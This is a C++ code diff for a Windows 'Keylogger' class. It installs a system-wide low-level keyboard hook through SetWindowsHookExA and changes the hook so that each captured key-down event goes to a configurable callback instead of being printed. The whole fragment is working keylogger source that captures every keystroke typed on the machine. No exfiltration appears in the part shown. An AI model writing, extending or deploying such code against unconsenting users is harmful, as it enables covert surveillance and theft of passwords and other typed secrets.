@@ -10,13 +10,15 @@ std::vector<std::string> Keylogger::vkCodesAll {
 
 HHOOK Keylogger::hookKeyboard = nullptr;
 MSG Keylogger::msg { 0 };
+std::function<void(PKBDLLHOOKSTRUCT)> Keylogger::callback;
 
-HHOOK hookKeyboardAddress = nullptr;
+HHOOK__* hookKeyboardAddress = nullptr;
+std::function<void(PKBDLLHOOKSTRUCT)>* callbackAddress = nullptr;
 LRESULT ProcKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
 	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
 
 	if(wParam == WM_KEYDOWN && nCode == HC_ACTION) {
-		printf("%i ", key->vkCode);
+		(*callbackAddress)(key);
 	}
 
 	return CallNextHookEx(hookKeyboardAddress, nCode, wParam, lParam);
@@ -25,8 +27,24 @@ LRESULT ProcKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
 Keylogger::Keylogger() {
 	if(!hookKeyboard) {
 		hookKeyboard = SetWindowsHookExA(WH_KEYBOARD_LL, ProcKeyboard, 0, 0);
+
 		hookKeyboardAddress = hookKeyboard;
 	}
+}
+
+void Keylogger::SetCallback(std::function<void(PKBDLLHOOKSTRUCT)>& callback) {
+	this->callback = callback;
+	callbackAddress = &callback;
+}
+
+Keylogger::Keylogger(std::function<void(PKBDLLHOOKSTRUCT)>& callback) {
+	if(!hookKeyboard) {
+		hookKeyboard = SetWindowsHookExA(WH_KEYBOARD_LL, ProcKeyboard, 0, 0);
+
+		hookKeyboardAddress = hookKeyboard;
+	}
+
+	SetCallback(callback);
 }
 
 Keylogger::~Keylogger() {
